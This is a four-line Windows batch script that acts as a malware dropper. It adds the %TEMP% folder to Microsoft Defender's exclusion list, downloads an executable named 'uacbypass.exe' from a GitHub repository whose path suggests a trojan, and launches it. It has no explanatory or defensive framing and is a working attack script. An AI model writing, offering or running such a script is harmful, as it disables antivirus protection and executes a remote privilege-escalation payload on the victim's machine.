@echo off
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
curl -L -o "%TEMP%\uacbypass.exe" "https://github.com/gsfv/tro.j/raw/refs/heads/main/uacbypass.exe"
start "" "%TEMP%\uacbypass.exe"
